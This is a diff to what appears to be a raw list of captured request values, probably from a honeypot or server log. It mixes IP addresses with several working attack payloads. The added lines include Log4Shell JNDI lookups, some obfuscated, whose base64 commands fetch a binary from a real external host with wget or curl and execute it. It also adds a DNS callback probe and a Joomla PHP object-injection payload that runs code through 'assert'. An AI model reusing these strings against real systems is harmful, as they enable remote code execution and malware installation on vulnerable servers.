@@ -1,11 +1,17 @@
+${jndi:ldap://185.8.172.132:1389/a}
 112.162.145.56
 127.0.0.1
 163.105.70.248
 178.238.203.26
 204.159.251.65
 204.48.20.180
+219.179.238.48
 222.59.114.221
 226.185.28.45
 250.208.72.216
 81.99.253.104
 82.137.255.161
+t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//137.184.40.48:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NldHVwOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc2V0dXA7IGNobW9kIDc3NyBzZXR1cDsgLi9zZXR1cCBleHBsb2l0}')
+t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGNobW9kIDc3NyBzc2hkX3B0eTsgLi9zc2hkX3B0eSBleHBsb2l0}')
+{jndi:dns://204-48-20-180.xforwardedfor.scanworld.net}
+}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý
